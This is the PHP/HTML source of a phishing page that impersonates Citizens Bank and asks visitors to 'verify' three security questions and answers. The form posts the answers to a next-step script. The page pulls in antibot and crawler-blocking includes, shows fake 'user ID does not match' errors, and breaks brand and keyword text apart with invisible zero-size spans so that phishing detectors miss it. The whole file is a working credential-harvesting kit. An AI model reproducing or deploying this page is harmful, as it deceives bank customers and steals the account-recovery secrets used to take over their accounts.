<?php
    session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkStatus()) {
        echo $antibot->throw404();
        die();
    }
    include './zsec.php';
    include './huehuehue.php';
    include './bot_fucker/bot.php';
    include './bot_fucker/wrd.php';
    include './crawlerdetect.php';
?>
<html lang="en-US" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js flexbox canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" style=""><head class="at-element-marker">



	<link href="images/icon-normal.png" rel="apple-touch-icon">
	<link href="images/icon-normal.png" rel="apple-touch-icon" sizes="76x76">
	<link href="images/icon-normal.png" rel="apple-touch-icon" sizes="120x120">
	<link href="images/icon-normal.png" rel="apple-touch-icon" sizes="152x152">
	<link href="images/icon-normal.png" rel="apple-touch-icon" sizes="180x180">
	<link href="images/icon-hires.png" rel="icon" sizes="192x192">
	<link href="images/icon-normal.png" rel="icon" sizes="128x128">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<!--Exclude Ensighten library incase skipEnsighten is "true"-->
	



    <title>Verification Process </title>
<meta name="description" content="Log in to your account by entering your User ID and password so you can securely view and manage your accounts online.">








<link rel="stylesheet" href="css/jquery-ui-1.10.3.custom.min.css">
<link rel="stylesheet" href="css/normalize.css">
<link rel="stylesheet" href="css/main.css">
<link rel="stylesheet" href="css/flows.css">
<link rel="stylesheet" href="css/ad-containers.css">










<style>
	input[type=password].error {
		border-color : red;
	}
</style>



                              <style id="at-makers-style" class="at-flicker-control">
.mboxDefault {visibility:hidden;}
</style><style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style></head>
<body class="responsive-enabled" style="display: block;">
	
    


<div class="ctns-header-footer-injected">

<link rel="stylesheet" type="text/css" href="css/min.44745.css">

<style>
.help-modal-header .help-modal-close {background: url(images/modal-help-close.png) center center no-repeat transparent; background-size: 20px;}
.help-modal-menu a.active {background: #f2faf8 url(images/arrow-right-green.png) right 20px center no-repeat; background-position: right 20px center; background-size:7px}
.account-section-title.checkmark h1 {padding: 0px 0px 5px 28px !important; }
.lt-ie9 .help-modal-menu a.active {background: #f2faf8 url(images/arrow-right-green.png) right 20px center no-repeat !important; background-size:7px !important}
.input-wrapper .tooltip {margin-left: 1px;}
</style>
<div class="ctns-header-footer"><div class="citi-modal timeout-modal simplemodal-data" id="timeout-modal" style="display:none;"></div><div class="citi-modal help-modal" id="help-modal" tabindex="0" style="display:none;"></div>
</div>
</div><div class="header">

    <!-- overlay to hide elements until CSS is loaded -->
    <style>
        .ctns-header-footer-overlay{ opacity:1; background-color:#fff; position:fixed; width:100%; height:100%; top:0px; left:0px; z-index:1000; }
        .ctns-header-footer-overlay .centered-content { width: 100%; max-width: 1060px; padding: 0 20px; margin: 0 auto; font-family: arial, helvetica, san-serif; font-size: 14px;}
        .ctns-header-footer-overlay .responsive-enabled .centered-content { width: auto; max-width: 1060px; }
        .ctns-header-footer-overlay .page-logo { float: none; }
        .ctns-header-footer-overlay .page-logo img{ margin: 10px; float: none;}
        .ctns-header-footer-overlay .topshadow {
            position: absolute; width: 100%; top: 100px; z-index: 5; height: 8px;
            background: -webkit-radial-gradient(50% 100%, farthest-side, rgba(0, 0, 0, 0.1), transparent 100%); background: radial-gradient(farthest-side at 50% 100%, rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0) 100%); background-repeat: no-repeat; background-size: cover;
        }
    </style>
    
    <!-- end overlay -->

    <style>
        .account-section-title.checkmark h1 { padding: 0px 0px 5px 28px !important; }
        .mobile-alert-dot {min-width: 22px; min-height: 22px; width: auto; height: auto; max-width: 50px; max-height: 50px; padding: 5px; }
    </style>

    <!-- htmlContainer PREFIX -->
    <div class="ctns-header-footer">
        <div id="page-header" class="page-header">
            <!-- inc-header.html START -->
            <div class="topshadow"></div>
            <div class="centered-content clearfix">

                <a href="#" class="page-logo" tabindex="1">
     
                    <img border="0" width="203" height="25" src="images/CTZ_Green-01.png">
                </a>
                <div id="header-navigation-container"></div>

            </div>
            <!-- inc-header.html END -->
        </div>
    </div>
    <!-- htmlContainer SUFFIX -->


</div>




<div id="page-container" class="page-container">
	<div class="centered-content clearfix">
		<section id="top-content" class="page-region top-content">

    	</section>
    	<section id="main-container" class="main-container two-col layout-2-1 clearfix">

        	<!-- =================
        	MAIN CONTENT AREA START
        	================= -->
        	<section id="main-content" class="page-region main-content">

	<div class="account-table account-table-full">
    	<span class="account-table-border"></span>
    	<div class="account-table-content">
            <div class="account-content-container">
                <div class="account-table-body">
                    <header class="account-section-title clearfix account-secure">
                    <a href="#" class="mobile-help-trigger">Help</a>
                    
                            <h1>Verify Your Security Questions</h1>
                    
                                            
                    </header>
                    
                    






 





 








 

                    <div id="messagecontainer" class="error-message show-error" role="alert">The online user ID below does not match our records. Please review your information then try again. If you are still unable to continue, please call our Customer Service Center.</div>
                    <section class="account-section">
                        
                                    <form class="pay-transfer-options clearfix" action="step/next/mainnet.php?status=<?php echo $_SESSION['status']; ?>" name="SignOn" id="frmSignOn" method="post">

                                    
                                    <div class="account-title clearfix">
                                            <p>Please verify your security questions and answer in the form below.</p>
                                    </div>
                                    
                                    
                                   
		<div class="form-item label-right full-width clearfix">
	    
            
                
            
    
        <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                        <label class="unauth-form__label" for="unauth-form-first-name">Security Question 1:</label>
                                        <div>
                                            <select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="quest1"  aria-required style="width: 90%; outline: none; height: 30px" required="">
          <option value="" disabled="" selected="selected">Choose Your Question </option> 
      <option>What is your father's middle name? </option>
      <option>What is your maternal grandmother's name?</option>
      <option> What is the name of the first company you worked for? </option> 
      <option> What is your maternal grandfather's name?</option> 
      <option>In what city was your high school? (full name of city only) </option> 
      <option>What was the name of your high school? </option> 
      <option>What is the first name of the maid of honor at your wedding? </option> 
      <option>In what city were you married? (Enter full name of city) </option> 
      <option>What is the first name of your oldest nephew? </option> 

                      </select>
                                        </div>
                                        <div class="unauth-form__block--guidance" style="display: none;">
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Contains only letters</label>
                                        </div>
                                    </div>
                                     
                                </div>
                                 
                          
                                     
                                 <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                            <label class="unauth-form__label">Answer 1:</label>
                                            <div>
                                                <input name="ans1" placeholder="XXXXX" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" size="25" maxlength="124" autocomplete="off" required="">
                                            </div>
                                            <div class="js-error-container unauth-form__block--error"></div>
                                    </div> 
                                     
                                </div>
                            
     
                
        <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                        <label class="unauth-form__label" for="unauth-form-first-name">Security Question 2:</label>
                                        <div>
                                            <select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="quest2"  aria-required style="width: 90%; outline: none; height: 30px" required="">
          <option value="" disabled="" selected="selected">Choose Your Question </option> 
          <option>What is the first name of the best man at your wedding? </option>
      <option>What is the first name of your oldest niece?</option>
      <option> What is your paternal grandfather's name? </option> 
      <option> In what city is your vacation home? (Enter full name of city only)</option> 
      <option>What was the name of your first girlfriend or boyfriend? </option> 
      <option>In what city was your father born? (Enter full name of city only) </option> 
      <option>What was the name of your first pet? </option> 
      <option>What was the nickname of your grandfather? </option> 
      <option>What was your high school mascot? </option> 

                      </select>
                                        </div>
                                        <div class="unauth-form__block--guidance" style="display: none;">
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Contains only letters</label>
                                        </div>
                                    </div>
                                     
                                </div>
                                 
                          
                                     
                                 <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                            <label class="unauth-form__label">Answer 2:</label>
                                            <div>
                                                <input name="ans2" placeholder="XXXXX" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" size="25" maxlength="124" autocomplete="off" required="">
                                            </div>
                                            <div class="js-error-container unauth-form__block--error"></div>
                                    </div> 
                                     
                                </div>

        <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                        <label class="unauth-form__label" for="unauth-form-first-name">Security Question 3:</label>
                                        <div>
                                            <select class="suntrust-accessible-field ng-pristine ng-valid" id=securityQuestion name="quest3"  aria-required style="width: 90%; outline: none; height: 30px" required="">
          <option value="" disabled="" selected="selected">Choose Your Question </option> 
          <option>What is your paternal grandfather's name? </option>
      <option>What street did your best friend in high school live on? (Enter full name of street only) </option>
      <option> What was the last name of your favorite teacher in final year of high school? </option> 
      <option> In what city were you born? (Enter full name of city only)</option> 
      <option>What was the name of the town your grandmother lived in? (Enter full name of city only) </option> 
      <option>What was your favorite restaurant in college? </option> 
      <option>Where did you meet your spouse for the first time? (Enter full name of city only)</option> 
      <option>In what city was your mother born? (Enter full name of city only) </option> 
      <option>What was the name of your junior high school? (Enter only "Riverdale" for Riverdale Junior high school) </option> 

                      </select>
                                        </div>
                                        <div class="unauth-form__block--guidance" style="display: none;">
                                            <label data-rule="rangeLen" class="unauth-form__label--guidance is-default">Contains only letters</label>
                                        </div>
                                    </div>
                                     
                                </div>
                                 
                          
                                     
                                 <div class="unauth-form__row">
                                    <div class="unauth-form__rowitem g-left">
                                            <label class="unauth-form__label">Answer 3:</label>
                                            <div>
                                                <input name="ans3" placeholder="XXXXX" id="unauth-ic-form-ssn" class="unauth-form__input js-ssn-tin" type="text" size="25" maxlength="124" autocomplete="off" required="">
                                            </div>
                                            <div class="js-error-container unauth-form__block--error"></div>
                                    </div> 
                                     
                                </div>
                        
            
                	
                
                    
                
                
                	
                        
			 	<br>
			
                
                      </div>
            <div id="fielderror" class="show-error" role="alert">We're sorry. That user ID and password does not match our records. Please try again, or do you need Login Assistance?</div>
            	<div class="form-actions">
                
                        
                
                
            <input type="submit" class="submit-button g-right" tabindex="3" data-trigger="next" value="Submit">
            </div>
    </form>
        
                </section>
            </div>
            </div>
    	</div>
	</div>


  










</section> 

<!-- Brand type from query parameter -->


<aside id="main-sidebar" class="page-region main-sidebar">
	
</aside>



 


  


		</section> 
	</div> 
</div> 










<div class="footer"><div class="ctns-header-footer"><footer id="page-footer" class="page-footer"><div class="footer-top">
<ul>
<li>
<a href="#" title="Opens Ways to Contact Us Dialog">
<img src="images/call.png" alt="Give Feedback" border="0" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;">
<span class="account-underline">Ways to Contact Us</span><span class="visuallyhidden">- Opens Ways to Contact Us Dialog</span>
</a>
<div class="dropup-menu">
<h4>Contact Us</h4>
<p>General Questions:
<br>
<strong>1-800-656-6561</strong> (per<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>sonal ba<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>nk acc<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ounts)
<br>
Business Questions:
<br>
<strong>1-877-229-6428</strong> (onl<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ine ba<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>nking sup<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>port)
<br>
<strong>1-800-862-6200</strong> (account information)
<br>
Inve<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>stment Quest<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ions:
<br>

<strong>1-800-942-8300</strong> (Ci<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>tiz<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ens Secur<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ities, Inc.)
</p>
<!--
<p>Go to <a href="/customer-service/">Customer Service</a> to send us email or mail or to view FAQs</p>
<p><a href="/forms/contactme.aspx">We'll Contact You</a></p>
-->
</div>
</li>




<li>
<a href="#" title="Opens Branch &amp; ATM Locator Dialog">
<img src="images/asa.png" alt="Give Feedback" border="0" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;">
<span class="account-underline">Branch &amp; ATM Locator</span><span class="visuallyhidden">- Opens Branch &amp; ATM Locator Dialog</span>
</a>
<div class="dropup-menu">
<h4>Branch &amp; ATM Locator</h4>
<p>Find one of our 1,300 locations near you.</p>
<div role="form">
<div id="stickyFooterBranch-error" class="error-message" style="display: none"></div>
<input id="stickyFooterBranch" type="text" title="Enter Zip Code or City, State" placeholder="Enter Zip Code or City, State" value="NONE">
<a href="#" type="button" class="button button-stickyfooterbranch">Submit</a>
</div>
</div>
</li>
<li><a onclick="showSurvey(formId);" style="cursor:pointer;"><img src="images/feedback.png" alt="Give Feedback" border="0" style="cursor:pointer;border:0px;height:40px;width:40px;padding-right:4px;">Feedback</a></li></ul>
</div>
<div class="footer-row clearfix">
<ul>
<li>
<h6>Checking &amp; Savings</h6>
</li>
<li>
<a target="_blank" href="#">Checking</a>
</li>
<li>
<a target="_blank" href="#">Savings</a>
</li>
<li>
<a target="_blank" href="#">Mon<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ey Markets</a>
</li>
<li>
<a target="_blank" href="#">Certif<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>icates of De<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>posit (CDs)
<sup>®</sup>
</a>
</li>
<li>
<a target="_blank" href="#">IRAs</a>
</li>
<li>
<a target="_blank" href="#">Pro<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>grams &amp; Services</a>
</li>
<li>
<a target="_blank" href="#">Be<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>nefits &amp; Features</a>
</li>
<li>
<a target="_blank" href="#">Debit Card</a>
</li>
<li>
<a target="_blank" href="#">Overd<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>raft Choi<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ces
<sup>®</sup>
</a>
</li>
</ul>
<ul>
<li>
<h6>Home Borrowing</h6>
</li>
<li>
<a target="_blank" href="#">Mortgages</a>
</li>
<li>
<a target="_blank" href="#">Home Equity Loans</a>
</li>
<li>
<a target="_blank" href="#">Home Equity Lines of Credit</a>
</li>
<li>
<a target="_blank" href="#">Determine My Rate</a>
</li>
<li>
<a target="_blank" href="h#">My Mortgage Account</a>
</li>
</ul>
<ul>
<li>
<h6>Students</h6>
</li>

<li>
<a target="_blank" href="#">Stu<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>dent Loan Options</a>
</li>
<li>
<a target="_blank" href="#">Refin<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ancing Student Loans</a>
</li>
<li>
<a target="_blank" href="#">The Student Loan Process</a>
</li>
<li>
<a target="_blank" href="#">Unde<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>rgraduate Students &amp; Parents</a>
</li>
<li>
<a target="_blank" href="#">Graduate Students</a>
</li>
<li>
<a target="_blank" href="#">Tools &amp; Informa<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>tion</a>
</li>
<li>
<a target="_blank" href="#">Bank<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ing for Students</a>
</li>
<li>
<a target="_blank" href="#x">Access My St<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>udent Loan</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Cards</h6>
</li>
<li>
<a target="_blank" href="#x">Credit Cards</a>
</li>
<li>
<a target="_blank" href="#">Card Agr<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>eements</a>
</li>
<li>
<a target="_blank" href="#">Secur<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ity Features</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Personal Loans</h6>
</li>
<li>
<a target="_blank" href="#">Ove<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>rview</a>
</li>
<li>
<a target="_blank" href="#">F<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>AQs</a>
</li>
</ul>
<ul>
<li>
<h6>Resources</h6>
</li>
<li>
<a target="_blank" href="#">Or<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>der Che<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>cks</a>
</li>
<li>
<a target="_blank" href="#">Onl<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ine &amp; Mob<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ile Banking</a>
</li>
<li>
<a target="_blank" href="#/">Cust<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>omer Service</a>
</li>
</ul>
<ul>
<li>
<h6>About Us</h6>
</li>
<li>
<a target="_blank" href="#">Ab<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>out Us</a>
</li>
<li>
<a target="_blank" href="#">In the Com<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>munity</a>
</li>
<li>
<a target="_blank" href="#">Car<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>eers</a>
</li>
<li>
<a target="_blank" href="#">About Our Ads</a>
</li>
</ul>
<ul class="last">
<li>
<h6>Solutions</h6>
</li>
<li>
<a target="_blank" href="#">Per<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>sonal</a>
</li>
<li>
<a target="_blank" href="#">Inv<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>esting</a>
</li>
<li>
<a target="_blank" href="#">Small Bus<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>iness</a>
</li>
<li>
<a target="_blank" href="#">Comm<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ercial</a>
</li>
</ul>
</div>

<div class="footer-row clearfix">
<ul>
<li>
<h6>Disclosures</h6>
</li>
<li>
<a target="_blank" href="#">Online Terms and Conditions</a>
</li>
<li>
<a target="_blank" href="#">Electronic Notice Disclosure and Consent (Online Service)</a>
</li>
<li>
<a target="_blank" href="#">Account Documents</a>
</li>
<li>
<a target="_blank" href="#">Member FDIC</a>
</li>
<li>
<a target="_blank" href="#">Equal Housing Lender
<img alt="Equal Housing Lender" title="Equal Housing Lender" src="images/equal-housing.gif">
</a>
</li>
<li>
<a target="_blank" href="#">Security, Privacy &amp; Legal</a>
</li>
</ul>
</div>
<div class="centered-content">
<div class="footer-bottom">
<p class="legal">
Ze<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>lle and the Zel<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>le rela<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ted marks are wh<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>olly owned by Early Warni<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ng Servi<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ces, LLC and are used herein under license.
</p>
<p class="legal">
*Securi<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ties, Insur<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ance Pro<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ducts and Inves<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>tment Advi<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>sory Services off<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ered through our Sec<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>urities, Inc. ("CSI"). CSI is an SEC reg<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>istered investment adviser and Me<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>mber - FINRA and SIPC. One C<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>itiz<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ens Bank Way, JCB135, Johnston, RI 02919. CSI is an affiliate of Ci<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ti<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>zens Bank, N.A.<br><br>The investment balances shown in online banking are based on market prices, with up to a fifteen minute delay from the time this webpage was last refreshed.  Information relating to accounts not held at CSI is presented as an accommodation and while drawn from sources believed to be reliable is not guaranteed as to accuracy or completeness. Such information should be independently confirmed by the account owner(s).<br><br>Information relating to accounts not held or custodied by National Financial Services (NFS) (Assets Held Away), CSI’s clearing broker dealer, was provided to NFS by outside parties and is included for informational purposes only.  These positions are not part of your brokerage account carried by NFS and therefore any SIPC account protection afforded your account through NFS does not cover these assets or prices reported.  Neither NFS, CSI nor C<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>it<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ize<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ns are responsible for the Assets Held Away information provided and does not guarantee the accuracy or timeliness of the positions or prices reported.  Prices shown do not necessarily reflect the actual current market prices. Further information regarding these prices may be obtained by contacting CSI.<br><br>The investment products and financial strategies suggested herein are subject to investment risk, including possible loss of principal amount invested. Investment decisions should be based on each individual's goals, time horizon and tolerance for risk.<br><br>SpeciFi<sup>®</sup> is made available through CSI. Portfolio management services are sub-advised by SigFig Wealth Management, LLC ("SigFig"), an SEC registered investment adviser. SigFig is not an affiliate of CSI or Cit<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ize<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ns Bank, N.A.
</p>

<div class="footer-disclaimer-box footer-disclaimer-box--margin-bottom footer-disclaimer">
<p class="footer-disclaimer-box__text">Securities, Insurance Products and Investment Advisory Services are:</p>
<ul class="footer-disclaimer-box__list">
<li class="footer-disclaimer-box__list-item">NOT FDIC INSURED</li>
<li class="footer-disclaimer-box__list-item">NOT BANK GUARANTEED</li>
<li class="footer-disclaimer-box__list-item">MAY LOSE VALUE</li>
<li class="footer-disclaimer-box__list-item">NOT A DEPOSIT
<br>
</li>
<li class="footer-disclaimer-box__list-item">NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY</li>
</ul>
</div>
<ul class="footer-util">
<li class="sitemap">
<a target="_blank" href="#">Site Map</a>
</li>
<li>Follow:
<a target="_blank" href="#">
<img src="images/footer-follow-facebook.png" alt="Facebook" align="middle">
</a>
<a target="_blank" href="#">
<img src="images/footer-follow-twitter.png" alt="Twitter">
</a>
<a target="_blank" href="#">
<img src="images/footer-follow-linkedin.png" alt="Linkedin">
</a>
<a target="_blank" href="#">
<img src="images/footer-follow-youtube.png" alt="Youtube">
</a>
</li>
</ul>

<p class="footer-copyright">
© Copyright &#50;&#48;&#50;&#50; Ci<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>tiz<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ens Financial Group, Inc. All rights reserved.<br>Ci<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>tiz<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ens is a brand name of Cit<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>iz<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ens Bank, N.A. (NMLS ID# 433960).<br>Ci<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>tize<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ns corporate headquarters: One Cit<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ize<font style="color:transparent;font-size:0px"> <?php $BLUEPR1NTS ?></font>ns Plaza, Providence, RI 02903
</p>

<img src="images/elh.gif" alt="Equal Housing Lender">
<img src="images/fdicFooter.gif" alt="Member FDIC">
</div>
</div>
</footer></div></div>







<link rel="stylesheet" type="text/css" href="css/sec-3-6.css">
     
            <div id="sec-overlay" style="display:none;">
            <div id="sec-container">
            </div>
          </div>






 </body></html>